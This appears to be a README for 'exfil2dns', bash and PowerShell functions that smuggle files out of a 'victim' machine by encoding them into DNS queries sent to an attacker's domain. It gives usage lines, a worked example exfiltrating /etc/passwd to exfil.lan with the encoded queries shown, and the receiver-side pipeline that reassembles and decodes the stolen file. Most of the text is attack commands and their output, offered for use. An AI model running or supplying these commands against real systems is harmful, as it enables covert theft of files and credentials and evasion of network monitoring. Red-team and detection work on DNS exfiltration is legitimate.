exfil2dns is stupid-simple bash/powershell functions that can be used to exfiltrate files to a DNS server.
There are many other DNS exfiltration tools that are much better, but I wrote this for something very simple that only used Bash and Powershell.

Bash functions are dnssend and dnsrec, and there is a dnssend function for Powershell.  Run dnsrec on your dns server and run dnssend on the victim system.


```
Usage on server: # dnsrec <filetorecieve> <domain>
Usage on victim: # dnssend <filetosend> <domain> [linenumber]
The line number is optional.  It retransmits a specific line in case the packet was dropped
The dnssend Powershell function double-wraps with base64, so you will need to add another "|base64 -d" when you restore the file.

Example on victim:
~ # dnssend /etc/passwd exfil.lan
line 1 / 12   H4sIAGZv81sAA21UTW+jMBC951dw3JUSGQJkU9+6WmkvbQ/t/gEHDFgFO7INJP3.1542680422.1.x.exfil.lan
line 2 / 12   1OzPOByloHDTP8+YxjMexxnh+4jGYRZeF50FpdhCuWZVCdkYDIwG7ANY7yxxQ7h.1542680422.2.x.exfil.lan
line 3 / 12   7TpjW10ivcPfEtGMWXSe7sgJSCocdKOSySdAGsjO/yPM04QXYVZQhXtegkKuV8F.1542680422.3.x.exfil.lan
line 4 / 12   /MASGfiPkh2Aovb8WTL0WWDsKwQRSMZwRm/PQL9Fxg4RHZHY1rWHstFcdUCfQ9G.1542680422.4.x.exfil.lan
line 5 / 12   LiUEb8bVcsS6n8DInYgHPMvo+wKLSWJcBCY5Ac9yxnHclMIL7HWK67ZBuYCWDlA.1542680422.5.x.exfil.lan
line 6 / 12   Unz2+CnoO6wIpIfhL1bXK4RSle1yv8M1K19ELbEavQota2iBAtHl2rYXHdmQJrr.1542680422.6.x.exfil.lan
line 7 / 12   +Iot99vXmXR2M9Sn2cnZdd9EOUndI/r2IHFjIX+msOpjzjWdPshOdlE0hanqASq.1542680422.7.x.exfil.lan
line 8 / 12   ZeKcfSqcuMVzFAYwSTGrtOwYij6ByEoSReNNVp9Ca+MXq/XcHd6HEwihSmtROvk.1542680422.8.x.exfil.lan
line 9 / 12   TVJLPxr7SYpwneLspvgWIpdudVDZdz2YC6+qJVUrnWkHSapb+OU31fcQsTOta8p.1542680422.9.x.exfil.lan
line 10 / 12   ETQyiUaQB1wPuxzPiqPvz9hGFW08i2HcUIvbm+ndwV9E+DOkeNDLOWWM6yXBzWr.1542680422.10.x.exfil.lan
line 11 / 12   cXvkQWvCUczP08deUeqK4h5jZ+YNKnYGh+elUoIH3iSR5zQNPqnR1Y9VjMfxW0n.1542680422.11.x.exfil.lan
line 12 / 12   S//BAAA.1542680422.12.x.exfil.lan
Flushing buffer.  You can ctrl-c on receiver when you see the ... dots on the receiver
done



Example on server:
~ # dnsrec /tmp/passwordfilefromvictim exfil.lan
+ means receiving data.  Wait for the dots, then ctrl-c.
Once complete, run: cat /tmp/passwordfilefromvictim |sort -t'.' -k3 -n |uniq |sed -e 's/\(.*\)\.[[:digit:]]*\.[[:digit:]]*.x.exfil.lan.*/\1/g' |base64 -d |gzip -d

++++++++++++++++++++++++...............^C

~ # cat /tmp/passwordfilefromvictim |sort -t'.' -k3 -n |uniq |sed -e 's/\(.*\)\.[[:digit:]]*\.[[:digit:]]*.x.exfil.lan.*/\1/g' |base64 -d |gzip -d |head
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
```

